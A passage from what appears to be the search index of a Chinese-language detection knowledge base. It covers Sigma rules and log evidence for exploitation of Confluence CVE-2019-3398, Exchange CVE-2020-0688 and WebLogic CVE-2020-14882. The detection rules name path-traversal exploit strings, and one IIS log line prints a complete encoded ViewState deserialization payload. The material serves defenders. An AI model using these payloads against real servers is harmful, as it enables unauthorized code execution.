&lt;= version &lt; 6.12.4</p> <p>6.13.0 &lt;= version &lt; 6.13.4</p> <p>6.14.0 &lt;= version &lt; 6.14.3</p> <p>6.15.0 &lt;= version &lt; 6.15.2</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP.log</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a</p> <p>\uff08\u73af\u5883\u642d\u5efa+\u590d\u73b0\uff09CVE-2019-3398 Confluence\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e</p> <p>https://blog.csdn.net/qq_40989258/article/details/105274370</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5\u3002\u76f4\u63a5\u5f15\u7528\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\u4e2d\u7684\u6848\u4f8b\u6570\u636e\u8fdb\u884c\u7279\u5f81\u63d0\u53d6\u3002</p> <p></p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#sigma","title":"Sigma\u89c4\u5219","text":"<p>\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002</p> <pre><code>title: Confluence_CVE-2019-3398\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a\u68c0\u6d4b\nstatus: experimental\ndescription: \u68c0\u6d4bCVE-2019-3398\u4e2d\u63cf\u8ff0\u7684\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u7684\u5229\u7528\u884c\u4e3a \nreferences:\n    - https://devcentral.f5.com/s/articles/confluence-arbitrary-file-write-via-path-traversal-cve-2019-3398-34181\n    - https://blog.csdn.net/qq_40989258/article/details/105274370\nauthor: Florian Roth\ntranslator: 12306Bro\ndate: 2020/05/26\ntags:\n    - attack.initial_access\n    - attack.t1190\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        cs-method: 'POST'\n        c-uri|contains|all:\n            - '/upload.action'\n            - 'filename=../../../../'\n    condition: selection\nfields:\n    - c-ip\n    - c-dns\nfalsepositives:\n    - Unknown\nlevel: critical\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2019-3398-Confluence%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>\uff08\u73af\u5883\u642d\u5efa+\u590d\u73b0\uff09CVE-2019-3398 Confluence\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e</p> <p>https://blog.csdn.net/qq_40989258/article/details/105274370</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/","title":"T1190-CVE-2020-0688\u6f0f\u6d1e\u5229\u7528\u68c0\u6d4b","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#cve-2020-0688","title":"CVE-2020-0688\u6f0f\u6d1e","text":"<p>Microsoft Exchange Server\u662f\u5fae\u8f6f\u516c\u53f8\u4e00\u5957\u652f\u6301\u591a\u79cd\u7535\u5b50\u90ae\u4ef6\u7f51\u7edc\u534f\u8bae\u7684\u7535\u5b50\u90ae\u4ef6\u670d\u52a1\u7ec4\u4ef6\uff0c\u9664\u4f20\u7edf\u7684\u7535\u5b50\u90ae\u4ef6\u7684\u5b58\u53d6\u3001\u50a8\u5b58\u3001\u8f6c\u53d1\u4f5c\u7528\u5916\uff0c\u5728\u65b0\u7248\u672c\u7684\u4ea7\u54c1\u4e2d\u4ea6\u52a0\u5165\u4e86\u4e00\u7cfb\u5217\u8f85\u52a9\u529f\u80fd\uff0c\u5982\u8bed\u97f3\u90ae\u4ef6\u3001\u90ae\u4ef6\u8fc7\u6ee4\u7b5b\u9009\u548cOWA\uff08\u57fa\u4e8eWeb\u7684\u7535\u5b50\u90ae\u4ef6\u5b58\u53d6\uff09\u3002</p> <p>\u6f0f\u6d1e\u8d77\u4e8eMicrosoft Exchange\u670d\u52a1\u5668\u5728\u5b89\u88c5\u65f6\u5e76\u6ca1\u6709\u6b63\u786e\u521b\u5efa\u552f\u4e00\u5bc6\u94a5\uff0c\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u6b3a\u9a97\u76ee\u6807\u670d\u52a1\u5668\u53cd\u5e8f\u5217\u5316\u6076\u610f\u521b\u5efa\u7684ViewState\u6570\u636e\uff0c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u5728Exchange Control Panel web\u5e94\u7528\u4e0a\u6267\u884c\u4efb\u610f.net\u4ee3\u7801\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5177\u4f53\u590d\u6d4b\u53ef\u4ee5\u53c2\u8003</p> <ul> <li> <p>CVE-2020-0688\uff1aExchange Server\u4f7f\u7528\u56fa\u5b9a\u52a0\u5bc6\u5bc6\u94a5\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u4fee\u590d\u901a\u544a\uff1ahttps://www.anquanke.com/post/id/199772</p> </li> <li> <p>CVE-2020-0688_\u5fae\u8f6fEXCHANGE\u670d\u52a1\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0\uff1ahttps://www.cnblogs.com/pt007/p/12394722.html</p> </li> </ul>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP\u6d41\u91cf\u3001Windows sysmon\u65e5\u5fd7\u3001IIS\u65e5\u5fd7\u3001exchange\u65e5\u5fd7</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u53ef\u53c2\u8003\u4e0a\u8ff0\u6d4b\u8bd5\u6848\u4f8b</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>HTTP\u6d41\u91cf\u68c0\u6d4b\u89c4\u5219\u57fa\u4e8epayload\u5173\u952e\u8bcd\u8fdb\u884c\u68c0\u6d4b</p> <p>Windows sysmon\u65e5\u5fd7\u68c0\u6d4b\u89c4\u5219\u57fa\u4e8epayload\u5173\u952e\u8bcd\u68c0\u6d4b</p> <p>IIS\u65e5\u5fd7\u68c0\u6d4b\u89c4\u5219\uff0c\u7559\u75d5\u5982\u4e0b\uff1a</p> <pre><code>2020-03-09 17:16:50 ::1 POST /owa/auth.owa &amp;CorrelationID=&lt;empty&gt;;&amp;cafeReqId=9cff6edd-19a9-43c0-bdd2-a94adef6dd0c; 443 HealthMailbox062c8b451f3a4e21aa98fd88e45f499e@mail163.com ::1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1;+MSEXCHMON;+ACTIVEMONITORING;+OWACTP) - 302 0 0 0\n2020-03-09 17:16:58 172.*.*.27 GET /ecp/default.aspx __VIEWSTATEGENERATOR=B97B4E27&amp;__VIEWSTATE=%2FwEyhAYAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc%2BY2FsYy5leGU8L1N5c3RlbTpTdHJpbmc%2BDQogICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2BDQogICAgPC9PYmplY3REYXRhUHJvdmlkZXI%2BDQo8L1Jlc291cmNlRGljdGlvbmFyeT4LJ%2F5i3bVSrOTrkun3pNej4tluDK0%3D&amp;CorrelationID=&lt;empty&gt;;&amp;cafeReqId=e0874638-b142-4c77-84c1-c0434137e691; 443 limou 10.0.254.139 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:73.0)+Gecko/20100101+Firefox/73.0 - 500 0 0 1502\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: CVE-2020-0688 Exchange Exploitation via Web Log\nid: fce2c2e2-0fb5-41ab-a14c-5391e1fd70a5\nstatus: experimental\ndescription: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688\nreferences:\n    - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/\nauthor: Florian Roth\ndate: 2020/02/29\nlogsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-method: 'GET'\n        c-uri|contains:\n            - '/ecp/'\n            - '/owa/'\n    selection2:\n        c-uri|contains: '__VIEWSTATE='\n    condition: selection1 and selection2\nfields:\n    - c-ip\n    - c-dns\nfalsepositives:\n    - Unknown\ntags:\n    - attack.initial_access\n    - attack.t1190\nlevel: critical\n</code></pre> <pre><code>title: CVE-2020-0688 Exploitation via Eventlog\nid: d6266bf5-935e-4661-b477-78772735a7cb\nstatus: experimental\ndescription: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688\nreferences:\n    - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/\nauthor: Florian Roth\ndate: 2020/02/29\ntags:\n    - attack.initial_access\n    - attack.t1190\nlogsource:\n    product: windows\n    service: application\ndetection:\n    selection1:\n        EventID: 4\n        Source: MSExchange Control Panel\n        Level: Error\n    selection2:\n        - '*&amp;__VIEWSTATE=*'\n    condition: selection1 and selection2\nfalsepositives:\n    - Unknown\nlevel: high\n</code></pre> <pre><code>title: CVE-2020-0688 Exploitation IIS Eventlog\nid: d6266bf5-935e-4661-b477-78772735a7cb\nstatus: experimental\ndescription: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688\nreferences:\n    - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/\nauthor: Florian Roth\ndate: 2020/02/29\ntags:\n    - attack.initial_access\n    - attack.t1190\nlogsource:\n    product: windows\n    service: IIS\ndetection:\n    selection1:\n        cs-method: 'POST'\n        c-uri|contains: '/owa/auth.owa'\n    selection2:\n        cs-method: 'GET'\n        c-uri|contains: '__VIEWSTATEGENERATOR=* __VIEWSTATE='\n    timeframe: 3s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574\n    condition: selection1 and selection2\nfalsepositives:\n    - Unknown\nlevel: high\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>SIGMA rules</p> <p>https://github.com/Neo23x0/sigma/pull/644/files</p> <p>\u5728MICROSOFT EXCHANGE SERVER\u4e0a\u68c0\u6d4bCVE-2020-0688\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e</p> <p>https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"T1190-CVE-2020-14882-Weblogic Console HTTP \u534f\u8bae\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Weblogic\u662fOracle\u516c\u53f8\u63a8\u51fa\u7684J2EE\u5e94\u7528\u670d\u52a1\u5668\uff0cCVE-2020-14882\u5141\u8bb8\u672a\u6388\u6743\u7684\u7528\u6237\u7ed5\u8fc7\u7ba1\u7406\u63a7\u5236\u53f0\u7684\u6743\u9650\u9a8c\u8bc1\u8bbf\u95ee\u540e\u53f0\uff0cCVE-2020-14883\u5141\u8bb8\u540e\u53f0\u4efb\u610f\u7528\u6237\u901a\u8fc7HTTP\u534f\u8bae\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u4f7f\u7528\u8fd9\u4e24\u4e2a\u6f0f\u6d1e\u7ec4\u6210\u7684\u5229\u7528\u94fe\uff0c\u53ef\u901a\u8fc7\u4e00\u4e2aGET\u8bf7\u6c42\u5728\u8fdc\u7a0bWeblogic\u670d\u52a1\u5668\u4e0a\u4ee5\u672a\u6388\u6743\u7684\u4efb\u610f\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x1","title":"0x1 \u5f71\u54cd\u7248\u672c","text":"<p>Oracle:Weblogic : 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#0x2","title":"0x2 \u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u53ef\u53c2\u8003\uff1a</p> <p>https://www.cnblogs.com/2rsh0u/p/13911794.html # Weblogic\u672a\u6388\u6743\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-14882&amp;CVE-2020-14883\uff09\u590d\u73b0 </p> <p>https://www.cnblogs.com/potatsoSec/p/13895120.html # CVE-2020-14882 weblogic \u672a\u6388\u6743\u547d\u4ee4\u6267\u884c\u590d\u73b0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP.log</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u53ef\u53c2\u8003\u6f0f\u6d1e\u8be6\u60c5\u90e8\u5206</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Oracle WebLogic Exploit CVE-2020-14882\nstatus: \u6d4b\u8bd5\u72b6\u6001\ndescription: \u68c0\u6d4bWebLogic\u670d\u52a1\u5668\u4e0a\u7684\u653b\u51fb\u4f01\u56fe\nreferences:\n    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14882\n    - https://www.cnblogs.com/2rsh0u/p/13911794.html\n    - https://www.cnblogs.com/potatsoSec/p/13895120.html\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        c-uri|contains:\n            - '/console/images/%252E%252E%252Fconsole.portal'\n            - '/console/css/%2e'\n    condition: selection\nfields:\n    - c-ip\n    - c-dns\nfalsepositives:\n    - Unknown\nlevel: high\ntags:\n    - attack.t1190\n    - attack.initial_access\n    - cve.2020-14882\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","title":"\u5efa\u8bae","text":"<p>\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>Weblogic\u672a\u6388\u6743\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-14882&amp;CVE-2020-14883\uff09\u590d\u73b0</p> <p>https://www.cnblogs.com/2rsh0u/p/13911794.html</p> <p>CVE-2020-14882 weblogic \u672a\u6388\u6743\u547d\u4ee4\u6267\u884c\u590d\u73b0</p> 